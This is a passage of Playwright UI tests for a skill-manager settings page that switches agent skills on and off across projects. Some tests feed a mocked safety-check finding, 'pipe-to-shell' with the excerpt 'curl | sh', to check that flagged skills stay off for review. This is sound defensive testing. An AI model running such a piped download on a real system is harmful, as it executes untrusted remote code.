      { id: 'claude', installed: true, enforce: 'soft', enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'claude-code' },
      { id: 'codex', installed: true, enforce: 'hard', enforcement: 'asked', consoleEnforcement: 'none', installable: true, installAs: 'codex' },
    ]; });
    await page.getByRole('radio', { name: 'orbit' }).click();
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    await expect(row(page, 'pdf').getByRole('list', { name: 'Installed for' }).getByRole('listitem')).toHaveText([/User · Won’t load when off~/, /User · Asked when off · console: not enforced when off~/]);
  });

  test('skipped folders show as one short note on the summary line', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { notShown: 3 }; });
    await open(page);
    await expect(summary(page)).toHaveText('13 skills · 3+ folders not shown');
    await page.getByRole('searchbox', { name: 'Search skills' }).fill('pdf');
    await expect(summary(page)).toHaveText('1 of 13 skills');
  });

  test('logos drawn on black tiles drop the tile on dark chips', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { document.documentElement.dataset.theme = 'dark'; });
    const logo = row(page, 'webapp-testing').locator('.provider-logo[data-provider=opencode]');
    expect(await logo.evaluate(el => getComputedStyle(el).mixBlendMode)).toBe('screen');
    await page.evaluate(() => { document.documentElement.dataset.theme = 'light'; });
    expect(await logo.evaluate(el => getComputedStyle(el).mixBlendMode)).toBe('normal');
  });

  test('scope buttons fit inside their track and all projects includes project skills', async ({ page }) => {
    await open(page);
    const track = await page.locator('.skill-manager-scope').boundingBox();
    for (const button of await page.locator('.skill-manager-scope>button').all()) {
      const box = (await button.boundingBox())!;
      expect(box.y).toBeGreaterThanOrEqual(track!.y);
      expect(box.y + box.height).toBeLessThanOrEqual(track!.y + track!.height);
    }
    await expect(row(page, 'orbit-deploy').locator('.skill-chip-project')).toHaveText('orbit');
    await expect(row(page, 'orbit-deploy').locator('.skill-chip-project')).toHaveAttribute('data-tip', 'Installed in orbit');
    await expect(row(page, 'orbit-deploy').locator('.skill-chip-project .icon')).toBeVisible();
    await expect(toggle(page, 'orbit-deploy')).toHaveAccessibleName('orbit-deploy in all projects');
  });

  test('a project chip says “Also installed” when agents’ home folders hold the skill too', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { skills: [
      { name: 'both', description: 'In the home folder and in orbit.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/both' }, { harness: 'claude', scope: 'project', path: '.claude/skills/both', projectId: 'project-1' }] },
    ] }; });
    await open(page);
    await expect(row(page, 'both').locator('.skill-chip-project')).toHaveAttribute('data-tip', 'Also installed in orbit');
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(row(page, 'both').locator('.skill-chip-project')).toHaveAttribute('data-tip', 'Also installed in orbit');
  });

  test('opened from a project’s thread, the page starts on that project', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__activeProject = 'project-1'; });
    await open(page);
    await expect(page.getByRole('radio', { name: 'orbit', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_list').map((c: any) => c.args.projectId ?? ''))).toEqual(['project-1']);
  });

  test('a project Settings doesn’t offer opens All projects', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__activeProject = 'project-9'; });
    await open(page);
    await expect(page.getByRole('radio', { name: 'All projects', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(toggle(page, 'pdf')).toBeVisible();
  });

  test('open rows stay open until the new scope’s list loads, and through a failed load', async ({ page }) => {
    await open(page);
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    await expect(row(page, 'pdf')).toHaveAttribute('data-open', '');
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_list'; });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(page.locator('[data-sm-load-error]')).toBeVisible();
    await expect(row(page, 'pdf')).toHaveAttribute('data-open', '');
    await delay(page, 'skill_manager_list', [600]);
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(page.locator('.skill-manager-body')).toHaveClass(/is-stale/);
    await expect(row(page, 'pdf')).toHaveAttribute('data-open', '');
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    await expect(row(page, 'pdf')).not.toHaveAttribute('data-open', '');
  });

  test('disclosure arrows share a leading column and align with the title line', async ({ page }) => {
    await open(page);
    const checkColumns = async () => {
      const rows = await page.locator('.skill-row').all();
      const first = (await rows[0].locator('[data-sm-expand] > .icon').boundingBox())!;
      for (const item of rows) {
        const arrow = (await item.locator('[data-sm-expand] > .icon').boundingBox())!;
        const title = (await item.locator('.ds-row-title').boundingBox())!;
        expect(arrow.x).toBeCloseTo(first.x, 1);
        expect(arrow.width).toBeCloseTo(first.width, 1);
        expect(arrow.x + arrow.width).toBeLessThan(title.x);
        expect(arrow.y + arrow.height / 2).toBeCloseTo(title.y + title.height / 2, 0);
      }
    };
    await checkColumns();
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    await checkColumns();
    await page.setViewportSize({ width: 620, height: 940 });
    await checkColumns();
  });

  test('both failed overlapping saves restore confirmed state', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__failures = 2; });
    await toggle(page, 'docx').click();
    await toggle(page, 'docx').click();
    await expect(toggle(page, 'docx')).not.toHaveAttribute('aria-busy', 'true');
    await expect(toggle(page, 'docx')).toBeChecked();
    await expect(row(page, 'docx').getByRole('alert')).toContainText('disk full');
  });

  test('Add opens while the inventory is unavailable', async ({ page }) => {
    await open(page);
    await page.evaluate(async () => {
      const { mountSkillManager } = await import('/src/skill-manager.ts' as string);
      mountSkillManager(document.getElementById('host')!, { call: () => new Promise(() => {}), projects: () => [] });
    });
    await page.getByRole('button', { name: 'Add skill' }).click();
    await expect(page.getByRole('dialog', { name: 'Add skill' })).toBeVisible();
  });

  test('findings stay in the dialog and can be enabled in all projects', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__findings = [{ skill: 'xlsx', rule: 'pipe-to-shell', file: 'SKILL.md', line: 1, excerpt: 'curl | sh' }]; });
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    // The result view: a warning heading, one compact line per finding, where it is off, and what installed cleanly.
    // The source is final, so Source and Choose folder step aside; Done takes focus.
    await expect(dialog.getByRole('heading', { name: 'Flagged by the safety check' })).toBeVisible();
    await expect(dialog.locator('.skill-add-result-icon')).toHaveClass(/ds-warn/);
    const finding = dialog.getByRole('list', { name: 'Why xlsx was flagged' }).getByRole('listitem');
    await expect(finding).toHaveCount(1);
    await expect(finding.locator('.skill-flag-rule')).toHaveText('Download piped into a shell');
    await expect(finding.locator('.skill-flag-place')).toHaveText('SKILL.md:1');
    await expect(finding.locator('.skill-flag-excerpt')).toHaveText('curl | sh');
    await expect(dialog.getByText('Off in all projects until you review it.')).toBeVisible();
    await expect(dialog.locator('.skill-add-installed-line')).toHaveText('Installed: pptx.');
    await expect(dialog.getByRole('textbox', { name: 'Source' })).toBeHidden();
    await expect(dialog.getByRole('button', { name: 'Choose folder…' })).toBeHidden();
    await expect(dialog.getByRole('button', { name: 'Done', exact: true })).toBeFocused();
    // The page never says 'Installed 2 skills' when one of them is off for review.
    await expect(summary(page)).toContainText(/Installed 1 skill for .+ · 1 skill off for review\./);
    await dialog.screenshot({ path: 'test-results/skill-manager-add-flagged.png' });
    await dialog.getByRole('button', { name: 'Turn on anyway' }).click();
    await expect(dialog.getByRole('button', { name: 'Turned on', exact: true })).toBeDisabled();
    await expect(dialog.getByText('On in all projects.')).toBeVisible();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_set').at(-1).args)).toEqual({ name: 'xlsx', enabled: true });
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(dialog).toBeHidden();
  });

  test('a flagged update already off where it went stays off, with no Turn on anyway', async ({ page }) => {
    await open(page);
    const name = 'react-best-practices';
    await toggle(page, name).uncheck();
    await expect(toggle(page, name)).not.toHaveAttribute('aria-busy', 'true');
    await page.evaluate(skill => { (window as any).__findings = [{ skill, rule: 'pipe-to-shell', file: 'SKILL.md', line: 1, excerpt: 'curl | sh' }]; }, name);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('vercel-labs/agent-skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.locator('.skill-add-check', { hasText: name }).getByRole('checkbox').check();
    await dialog.getByRole('button', { name: /^Install \d+ skills?$/ }).click();
    // The add switched nothing off (it already was), so it offers nothing to undo.
    await expect(dialog.getByText('Stays off in all projects, as it was before.')).toBeVisible();
    await expect(dialog.getByRole('button', { name: 'Turn on anyway' })).toHaveCount(0);
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(toggle(page, name)).not.toBeChecked();
  });

  test('Turn on anyway follows native’s switchedOff, never the list read before the add', async ({ page }) => {
    await open(page);
    // Neither was off before, so a pre-add list read would offer both; native says the add switched only pptx off.
    await page.evaluate(() => {
      const flag = { rule: 'pipe-to-shell', file: 'SKILL.md', line: 1, excerpt: 'curl | sh' };
      (window as any).__findings = [{ skill: 'xlsx', ...flag }, { skill: 'pptx', ...flag }];
      (window as any).__switchedOff = ['pptx'];
    });
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    const xlsx = dialog.getByRole('region', { name: 'xlsx', exact: true }), pptx = dialog.getByRole('region', { name: 'pptx', exact: true });
    await expect(xlsx.getByText('Stays off in all projects, as it was before.')).toBeVisible();
    await expect(xlsx.getByRole('button', { name: 'Turn on anyway' })).toHaveCount(0);
    await expect(pptx.getByText('Off in all projects until you review it.')).toBeVisible();
    await expect(pptx.getByRole('button', { name: 'Turn on anyway' })).toBeVisible();
  });

  test('a flagged project add is off only in that project, and Turn on anyway clears that project’s switch', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    await page.evaluate(() => { (window as any).__findings = [{ skill: 'xlsx', rule: 'pipe-to-shell', file: 'SKILL.md', line: 1, excerpt: 'curl | sh' }]; });
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await expect(dialog.getByRole('combobox', { name: 'Install to' })).toHaveValue('project-1');
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog.getByText('Off in orbit until you review it.')).toBeVisible();
    await expect(dialog.getByText(/every project|all projects/)).toHaveCount(0);
    const xlsx = () => page.evaluate(() => (window as any).__mock.list({ projectId: 'project-1' }).skills.find((s: any) => s.name === 'xlsx'));
    expect(await xlsx()).toMatchObject({ offInPandaCode: false, offInProject: true });
    await dialog.getByRole('button', { name: 'Turn on anyway' }).click();
    await expect(dialog.getByRole('button', { name: 'Turned on', exact: true })).toBeDisabled();
    await expect(dialog.getByText('On in orbit.')).toBeVisible();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_set').at(-1).args)).toEqual({ name: 'xlsx', enabled: true, projectId: 'project-1' });
    expect(await xlsx()).toMatchObject({ offInPandaCode: false, offInProject: false, offInProjects: [] });
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(dialog).toBeHidden();
    await expect(toggle(page, 'xlsx', 'orbit')).toBeChecked();
    await expect(summary(page)).toContainText('Turned xlsx on in orbit.');
  });

  test('search filters by name and description, counts matches; Escape clears', async ({ page }) => {
    await open(page);
    const search = page.getByRole('searchbox', { name: 'Search skills' });
    await search.fill('word documents');
    await expect(page.locator('.skill-row')).toHaveCount(1);
    await expect(row(page, 'docx')).toBeVisible();
    await expect(summary(page)).toHaveText('1 of 13 skills');
    await search.fill('nothing like this');
    await expect(page.getByText('No skills match “nothing like this”')).toBeVisible();
    await search.press('Escape');
    await expect(search).toHaveValue('');
    await expect(page.locator('.skill-row')).toHaveCount(13);
    await expect(summary(page)).toHaveText('13 skills');
  });

  test('the search field shows a focus ring when reached by keyboard', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'All projects', exact: true }).focus();
    // The scope's info mark comes first (its tooltip opens on focus), then search.
    await page.keyboard.press('Tab');
    await expect(page.getByRole('img', { name: 'How switches work' })).toBeFocused();
    await page.keyboard.press('Tab');
    const search = page.getByRole('searchbox', { name: 'Search skills' });
    await expect(search).toBeFocused();
    const shadow = await search.evaluate(el => getComputedStyle(el).boxShadow);
    expect(shadow).toContain('0px 0px 0px 2px');
  });

  test('a project marks and lists its own skills first; more than three scopes use a select', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit' }).click();
    await expect(row(page, 'orbit-deploy')).toBeVisible();
    // The project's own skills lead, each with a quiet 'This project' tag instead of its own name.
    await expect(page.locator('.skill-row').nth(0)).toHaveAttribute('data-id', 'orbit-deploy');
    await expect(page.locator('.skill-row').nth(1)).toHaveAttribute('data-id', 'orbit-fixtures');
    await expect(row(page, 'orbit-deploy').locator('.skill-chip-project')).toHaveText('This project');
    await expect(row(page, 'orbit-deploy').locator('.skill-chip-project')).toHaveAttribute('data-tip', 'Installed in orbit');
    await expect(row(page, 'pdf').locator('.skill-chip-project')).toHaveCount(0);
    await page.locator('.skill-manager').screenshot({ path: 'test-results/skill-manager-project-own.png' });
    await expect(summary(page)).toHaveText('12 skills');
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    await page.getByRole('radio', { name: 'orbit' }).press('ArrowRight');
    await expect(page.getByRole('radio', { name: 'pandacode', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(row(page, 'tauri-ipc')).toBeVisible();
    await expect(row(page, 'orbit-deploy')).toHaveCount(0);

    await open(page, 3);
    const scope = page.getByRole('combobox', { name: 'Show skills for' });
    await expect(scope.locator('option').first()).toHaveText('All projects');
    await scope.selectOption('project-3');
    await expect(toggle(page, 'pdf', 'lumen')).toBeVisible();
    await expect(page.locator('.skill-row')).toHaveCount(10);
    await expect(row(page, 'pdf')).toBeVisible();
  });

  test('switching scope keeps the old list, dimmed and busy, until the new one arrives', async ({ page }) => {
    await open(page);
    await delay(page, 'skill_manager_list', [800]);
    await page.getByRole('radio', { name: 'orbit' }).click();
    const body = page.locator('.skill-manager-body');
    await expect(body).toHaveAttribute('aria-busy', '');
    await expect(body).toHaveClass(/is-stale/);
    await expect(page.locator('.skill-row-skeleton')).toHaveCount(0);
    await expect(page.locator('.skill-row')).toHaveCount(13);
    await expect(row(page, 'orbit-deploy')).toBeVisible();
    await expect(body).not.toHaveClass(/is-stale/);
    await expect(body).not.toHaveAttribute('aria-busy', '');
  });

  test('off in a project; off for all projects locks the project switch and links back', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit' }).click();
    await toggle(page, 'orbit-deploy', 'orbit').click();
    await expect(toggle(page, 'orbit-deploy', 'orbit')).not.toBeChecked();
    await expect(row(page, 'orbit-deploy')).toHaveClass(/is-off/);
    await expect(summary(page)).toHaveText('12 skills · 1 off in orbit');

    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await expect(row(page, 'orbit-deploy').locator('.skill-row-meta .skill-chip-off')).toHaveText('Off in orbit');
    await expect(row(page, 'orbit-deploy').locator('.skill-row-tags .skill-chip-off')).toHaveCount(0);
    await toggle(page, 'pdf').click();
    await expect(toggle(page, 'pdf')).not.toBeChecked();
    await expect(summary(page)).toHaveText('13 skills · 1 off in all projects');

    await page.getByRole('radio', { name: 'orbit' }).click();
    const locked = toggle(page, 'pdf', 'orbit');
    await expect(locked).toBeDisabled();
    await expect(locked).not.toBeChecked();
    await expect(locked).toHaveAccessibleDescription('Off in all projects');
    // The meta line says why (a lock and 'Off in all projects') and ends with a short 'Manage' link, in link ink.
    await expect(row(page, 'pdf').locator('.skill-row-meta')).toHaveText(/^Off in all projects\s*Manage$/);
    await expect(row(page, 'pdf').locator('.skill-row-meta .icon')).toBeVisible();
    await expect(row(page, 'pdf').locator('.skill-row-hint')).toHaveCount(0);
    const hint = row(page, 'pdf').locator('.skill-row-meta .skill-row-change');
    await expect(hint).toHaveText('Manage');
    await expect(hint).toHaveAccessibleName('Manage in All projects');
    const ink = await page.evaluate(() => { const probe = document.createElement('span'); probe.style.color = 'var(--accent-ink)'; document.body.append(probe); const color = getComputedStyle(probe).color; probe.remove(); return color; });
    expect(await hint.evaluate(el => getComputedStyle(el).color)).toBe(ink);
    expect(await hint.evaluate(el => ({ line: getComputedStyle(el).textDecorationLine, color: getComputedStyle(el).textDecorationColor === getComputedStyle(el).color }))).toEqual({ line: 'underline', color: true });
    expect((await hint.boundingBox())!.width).toBeLessThan(170);
    // No column is reserved: every row's controls are only the switch, locked or not; switches still line up.
    expect(Math.abs((await row(page, 'frontend-design').locator('.skill-row-controls').boundingBox())!.width - (await toggle(page, 'frontend-design', 'orbit').boundingBox())!.width)).toBeLessThan(1);
    expect(Math.abs((await row(page, 'pdf').locator('.skill-row-controls').boundingBox())!.width - (await locked.boundingBox())!.width)).toBeLessThan(1);
    expect(Math.abs((await locked.boundingBox())!.x - (await toggle(page, 'frontend-design', 'orbit').boundingBox())!.x)).toBeLessThan(1);
    await row(page, 'pdf').screenshot({ path: 'test-results/skill-row-locked.png' });
    // Off via All projects counts apart from the project's own switches.
    await expect(summary(page)).toHaveText('12 skills · 1 off in all projects · 1 off in orbit');
    await row(page, 'pdf').getByRole('button', { name: 'Manage in All projects', exact: true }).click();
    await expect(page.getByRole('radio', { name: 'All projects', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(toggle(page, 'pdf')).toBeFocused();
    await expect(toggle(page, 'pdf')).not.toBeChecked();
  });

  test('overlapping switches both stick, whatever order the saves answer in', async ({ page }) => {
    await open(page);
    await delay(page, 'skill_manager_set', [700, 50]);
    await toggle(page, 'docx').click();
    await toggle(page, 'pdf').click();
    await expect(toggle(page, 'docx')).toHaveAttribute('aria-busy', 'true');
    await expect(toggle(page, 'pdf')).toHaveAttribute('aria-busy', 'true');
    for (const name of ['pdf', 'docx']) await expect(toggle(page, name)).not.toHaveAttribute('aria-busy', 'true', { timeout: 3000 });
    await expect(toggle(page, 'docx')).not.toBeChecked();
    await expect(toggle(page, 'pdf')).not.toBeChecked();
    await expect(summary(page)).toHaveText('13 skills · 2 off in all projects');
    // A second flip of the same switch while it saves is kept, not undone.
    await delay(page, 'skill_manager_set', [500, 50]);
    await toggle(page, 'docx').click();
    await toggle(page, 'docx').click();
    await expect(toggle(page, 'docx')).not.toHaveAttribute('aria-busy', 'true', { timeout: 3000 });
    await expect(toggle(page, 'docx')).not.toBeChecked();
  });

  test('a failed switch rolls back and explains why beside the row', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_set'; });
    await toggle(page, 'docx').click();
    await expect(row(page, 'docx').getByRole('alert')).toHaveText('Couldn’t turn docx off: Could not save skill manager preferences: disk full');
    await expect(toggle(page, 'docx')).toBeChecked();
    await toggle(page, 'docx').click();
    await expect(toggle(page, 'docx')).not.toBeChecked();
    await expect(row(page, 'docx').getByRole('alert')).toHaveCount(0);
  });

  test('keyboard: Space flips a switch, Enter opens the details without repeating the description', async ({ page }) => {
    await open(page);
    await toggle(page, 'changelog').focus();
    await page.keyboard.press('Space');
    await expect(toggle(page, 'changelog')).not.toBeChecked();
    await expect(toggle(page, 'changelog')).toBeFocused();
    const body = row(page, 'pdf').locator('[data-sm-expand]');
    await body.focus();
    await page.keyboard.press('Enter');
    await expect(body).toHaveAttribute('aria-expanded', 'true');
    await expect(body.locator('.icon')).toBeVisible();
    await expect(row(page, 'pdf').locator('.ds-row-sub')).toHaveCount(0);
    await expect(row(page, 'pdf').locator('.skill-detail-description')).toHaveText(/Extract text, tables/);
    await expect(row(page, 'pdf').locator('.skill-row-details code').first()).toHaveText('~/.claude/skills/pdf');
    await expect(row(page, 'pdf').locator('.skill-detail-source')).toContainText('anthropics/skills');
    await expect(body).toBeFocused();
    await page.keyboard.press('Enter');
    await expect(body).toHaveAttribute('aria-expanded', 'false');
  });

  test('the summary tells skills that may still load apart from blocked ones', async ({ page }) => {
    await open(page);
    // Native says Claude Code can only be asked about this pdf (an override); sql-review stays blocked in OpenCode.
    await page.evaluate(() => { (window as any).__overrides = { pdf: { claude: { enforcement: 'asked', consoleEnforcement: 'asked' } } }; });
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await toggle(page, 'sql-review').uncheck();
    await expect(toggle(page, 'sql-review')).not.toHaveAttribute('aria-busy', 'true');
    await expect(summary(page)).toHaveText('13 skills · 2 off in all projects (1 may still load)');
    await expect(row(page, 'pdf').locator('.skill-row-asked')).toHaveAttribute('data-tip', 'Claude Code can only be asked not to use it.');
    await expect(row(page, 'sql-review').locator('.skill-row-asked')).toHaveCount(0);
    // A narrow page wraps the summary rather than cutting the off counts.
    await page.locator('#host').evaluate(el => { el.style.maxWidth = '300px'; });
    await expect(summary(page)).toHaveText('13 skills · 2 off in all projects (1 may still load)');
    expect(await summary(page).evaluate(el => el.scrollWidth <= el.clientWidth + 1 && getComputedStyle(el).textOverflow !== 'ellipsis')).toBe(true);
    const lines = await summary(page).evaluate(el => Math.round(el.getBoundingClientRect().height / parseFloat(getComputedStyle(el).lineHeight)));
    expect(lines).toBeGreaterThanOrEqual(2);
  });

  test('descriptions get two lines at 820px before they ellipsize', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 900 });
    await openSettingsPage(page, 'Skills');
    for (const name of ['frontend-design', 'orbit-deploy']) {
      const sub = row(page, name).locator('.ds-row-sub');
      const lines = await sub.evaluate(el => Math.round(el.getBoundingClientRect().height / parseFloat(getComputedStyle(el).lineHeight)));
      expect(lines).toBe(2);
    }
    // A row with logo-only chips shows its whole description: it isn't cut after a few words.
    expect(await row(page, 'orbit-deploy').locator('.ds-row-sub').evaluate(el => el.scrollHeight <= el.clientHeight + 1)).toBe(true);
    // Named chips never leave a description narrower than about 12rem: a row that would keeps logos only.
    for (const sub of await page.locator('.skill-row .ds-row-sub').all()) expect((await sub.boundingBox())!.width).toBeGreaterThan(180);
    // Settings at 820px is too narrow for names: logos on every row (decided per list, never per row); only a missing
    // agent's chip names it.
    expect(await page.locator('.skill-chip:not([data-missing]) .skill-chip-name').evaluateAll(names => names.every(n => getComputedStyle(n).display === 'none'))).toBe(true);
  });

  test('a missing agent chip names the agent and says it is missing, in text at every width, never only with a faded logo', async ({ page }) => {
    await page.setViewportSize({ width: 1200, height: 900 });
    await page.addInitScript(skills => { (window as any).__mockOptions = { skills }; }, TWO_CHIP_SKILLS);
    await open(page);
    const kimi = row(page, 'brand-guidelines').getByRole('img', { name: 'Kimi Code app missing', exact: true });
    await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = 'none'; });
    await expect(page.locator('.skill-manager-body')).toHaveAttribute('data-names', '');
    await expect(kimi.locator('.skill-chip-missing')).toHaveText('missing');
    await expect(kimi.locator('.skill-chip-name')).toHaveText('Kimi Code');
    await expect(kimi).toHaveText('Kimi Codemissing');
    // Stacked (name over 'missing') so it stays compact: never taller than the row's title and description.
    const [name, word] = await Promise.all([kimi.locator('.skill-chip-name').boundingBox(), kimi.locator('.skill-chip-missing').boundingBox()]);
    expect(word!.y).toBeGreaterThanOrEqual(name!.y + name!.height - 1);
    expect((await kimi.boundingBox())!.height).toBeLessThanOrEqual((await row(page, 'brand-guidelines').locator('.skill-row-body').boundingBox())!.height);
    // Too narrow for named chips: other chips keep logos only, but the missing one still names its agent.
    await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = '420px'; });
    await expect(page.locator('.skill-manager-body')).not.toHaveAttribute('data-names', '');
    await expect(row(page, 'brand-guidelines').getByRole('img', { name: 'Claude Code', exact: true }).locator('.skill-chip-name')).toBeHidden();
    await expect(kimi.locator('.skill-chip-name')).toBeVisible();
    await expect(kimi.locator('.skill-chip-missing')).toHaveText('missing');
    expect(await kimi.locator('.skill-chip-missing').evaluate(el => getComputedStyle(el, '::before').content)).toBe('none');
    expect(await kimi.evaluate(el => getComputedStyle(el, '::after').content)).toBe('none');
    await expect(kimi).toHaveAttribute('data-tip', 'Kimi Code app missing');
    // The details always say so, and never 'Not installed', which would read as if the skill weren't.
    await row(page, 'brand-guidelines').locator('[data-sm-expand]').click();
    await expect(row(page, 'brand-guidelines').locator('.skill-detail-missing')).toHaveText('App missing');
    await expect(row(page, 'brand-guidelines')).not.toContainText(/not installed/i);
  });

  test('Choose folder adds skills from a local folder; unswitchable names show disabled with the reason', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('button', { name: 'Choose folder…' }).click();
    await expect(dialog.getByRole('textbox', { name: 'Source' })).toHaveValue('/Users/you/Projects/new-project');
    await expect(dialog.getByText('3 skills found')).toBeVisible();
    const locked = dialog.getByRole('checkbox', { name: /^draft \(old\)/ });
    await expect(locked).toBeDisabled();
    await expect(locked).not.toBeChecked();
    // A short reason in place of the description; native's longer one is its tooltip.
    await expect(dialog.locator('.skill-add-check[data-locked] .skill-add-reason')).toHaveText('Its name isn’t supported.');
    await expect(dialog.locator('.skill-add-check[data-locked] .skill-add-reason')).toHaveAttribute('data-tip', 'PandaCode can\'t switch a skill with this name, so it can\'t be added from here.');
    // Select all never picks it.
    await dialog.getByRole('button', { name: 'Select none' }).click();
    await dialog.getByRole('button', { name: 'Select all' }).click();
    await expect(locked).not.toBeChecked();
    await expect(locked).toBeDisabled();
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog).toBeHidden();
    const args = await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_add').at(-1).args);
    expect(args.source).toBe('/Users/you/Projects/new-project');
    expect(args.skills).toEqual(['house-style', 'oncall-runbook']);
    await row(page, 'house-style').locator('[data-sm-expand]').click();
    await expect(row(page, 'house-style').locator('.skill-detail-source code')).toHaveText('/Users/you/Projects/new-project');
  });

  test('a cancelled folder picker leaves the dialog as it was', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__pick = null; });
    await open(page);
    await page.evaluate(async () => {
      document.getElementById('host')!.innerHTML = '';
      const { mountSkillManager } = await import('/src/skill-manager.ts' as string);
      const { createPreviewSkillManager } = await import('/src/preview-skill-manager.ts' as string);
      const mock: any = createPreviewSkillManager();
      const methods: any = { skill_manager_list: 'list', skill_manager_preview: 'preview' };
      (window as any).__previews = 0;
      mountSkillManager(document.getElementById('host')!, {
        call: async (command: string, args: any = {}) => { if (command === 'skill_manager_preview') (window as any).__previews++; return mock[methods[command]](args); },
        chooseFolder: async () => (window as any).__pick,
      });
    });
    await page.getByRole('button', { name: 'Add skill' }).first().click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('button', { name: 'Choose folder…' }).click();
    await expect(dialog.getByRole('textbox', { name: 'Source' })).toHaveValue('anthropics/skills');
    expect(await page.evaluate(() => (window as any).__previews)).toBe(0);
  });

  test('add skills from skills.sh into a project', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit' }).click();
    await expect(row(page, 'orbit-deploy')).toBeVisible();
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await expect(dialog.getByRole('link', { name: 'skills.sh' })).toHaveAttribute('href', 'https://skills.sh');
    const source = dialog.getByRole('textbox', { name: 'Source' });
    await source.fill('nobody/nothing');
    await source.press('Enter');
    await expect(dialog.getByRole('alert')).toContainText('found no skills at nobody/nothing');
    await source.fill('https://example.com/a/b');
    await source.press('Enter');
    await expect(dialog.getByRole('alert')).toContainText('Enter owner/repo');
    await delay(page, 'skill_manager_preview', [300]);
    await source.fill('https://skills.sh/vercel-labs/agent-skills');
    await source.press('Enter');
    await expect(dialog.getByRole('status')).toHaveText('Fetching skills… the first run can take a minute.');
    await expect(dialog.getByRole('checkbox', { name: /web-design-guidelines/ })).toBeChecked();
    await expect(dialog.getByRole('button', { name: 'Install 3 skills' })).toBeEnabled();
    const bulk = (await dialog.locator('.skill-add-bulk').boundingBox())!;
    const checklist = (await dialog.locator('.skill-add-skills').boundingBox())!;
    expect(bulk.y + bulk.height).toBeLessThanOrEqual(checklist.y);
    await dialog.getByRole('button', { name: 'Select none' }).click();
    await expect(dialog.getByRole('button', { name: 'Install 0 skills' })).toBeDisabled();
    await dialog.getByRole('checkbox', { name: /vercel-deploy/ }).check();
    await expect(dialog.getByRole('combobox', { name: 'Install to' })).toHaveValue('project-1');
    await expect(dialog.getByRole('combobox', { name: 'Install to' }).locator('option')).toHaveText(['All projects', 'orbit', 'pandacode', 'Bot library']);
    // The target says where it installs.
    await expect(dialog.locator('#skill-add-target-hint')).toHaveText('Into the project’s folders, like .claude/skills.');
